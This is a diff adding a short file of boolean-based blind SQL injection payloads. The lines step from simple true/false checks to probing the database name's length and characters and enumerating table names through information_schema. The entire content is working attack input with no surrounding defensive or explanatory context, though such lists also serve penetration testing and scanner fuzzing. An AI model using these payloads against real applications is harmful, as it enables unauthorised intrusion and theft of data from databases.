@@ -1,0 +1,10 @@
+1' AND 1=1--
+1' AND 1=2--
+1' AND 'a'='a--
+1' AND 'a'='b--
+1' AND LENGTH(database())>0--
+1' AND LENGTH(database())=1--
+1' AND ASCII(SUBSTRING(database(),1,1))>0--
+1' AND ASCII(SUBSTRING(database(),1,1))=115--
+1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+1' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users'--
